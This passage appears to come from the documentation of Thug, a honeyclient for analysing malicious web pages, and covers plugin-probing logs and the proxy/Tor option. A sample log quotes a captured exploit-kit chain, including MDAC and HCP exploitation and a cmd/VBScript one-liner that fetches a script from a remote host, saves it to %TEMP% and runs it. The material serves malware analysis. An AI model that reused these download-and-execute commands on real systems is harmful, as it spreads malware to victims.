<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_40
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_39
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_38
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_37
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_36
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_35
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_34
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_33
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_32
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_31
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_30
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_29
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_28
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_27
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_26
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_25
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_24
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_23
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_22
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_21
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_20
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_19
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_18
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_17
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_16
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_15
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_14
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_13
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_12
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_11
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_10
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_09
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.170_08
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javaplugin.170_07
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>AdobeReader<span class="w"> </span>version:<span class="w"> </span><span class="m">9</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Flash<span class="w"> </span>version:<span class="w"> </span><span class="m">10</span>,0,64,0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:56<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Java<span class="w"> </span>version:<span class="w"> </span><span class="m">1</span>,7,0,7
</pre></div>
</div>
</section>
<section id="proxy-support">
<h2>Proxy support<a class="headerlink" href="#proxy-support" title="Link to this heading"></a></h2>
<p>Another really useful option is <em>-p (–proxy)</em> which allows to specify a proxy. Currently Thug
supports HTTP, SOCKS4, SOCKS5 and SOCKS5H proxy using the following format</p>
<blockquote>
<div><p>scheme://[username:password&#64;]host:port
(supported schemes: http, socks4, socks5, socks5h)</p>
</div></blockquote>
<p>This option allows Thug to make use of Tor in order to anonymize the access to a malicious
page. The trick is quite simple and requires a Tor instance up and running. Simply run Thug
using <em>socks5://127.0.0.1:9050</em> as proxy and your real IP address will not be revealed.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-p<span class="w"> </span>socks5://127.0.0.1:9050<span class="w"> </span><span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:14<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:14<span class="o">]</span><span class="w"> </span>&lt;applet<span class="w"> </span><span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span><span class="w"> </span><span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:14<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>Ryp.jar<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:16<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:17<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>applet<span class="w"> </span>Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:17<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:17<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>adodb.stream<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>adodb.stream
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>Shell.Application<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shell.application
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:18<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>from<span class="w"> </span>URL<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:22<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>File:<span class="w"> </span>d328b5a123bce1c0d20d763ad745303a
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>send
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>open
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Write
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>SaveToFile<span class="w"> </span><span class="o">(</span>.//..//e9a458c.exe<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Close
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Shell.Application<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>ShellExecute<span class="w"> </span>command:<span class="w"> </span>.//..//e9a458c.exe
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>./data/ap1.php?f<span class="o">=</span>b081d<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:30<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Internet<span class="w"> </span>Explorer<span class="w"> </span>HCP<span class="w"> </span>Scheme<span class="w"> </span>Detected
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:30<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Help<span class="w"> </span>Center<span class="w"> </span>Malformed<span class="w"> </span>Escape<span class="w"> </span>Sequences<span class="w"> </span>Incorrect<span class="w"> </span>Handling
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>AST<span class="o">]</span>:<span class="w"> </span>Eval<span class="w"> </span>argument<span class="w"> </span>length<span class="w"> </span>&gt;<span class="w"> </span><span class="m">64</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="o">]</span><span class="w"> </span>Command:
cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe

<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Code:
cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>from<span class="w"> </span>URL<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
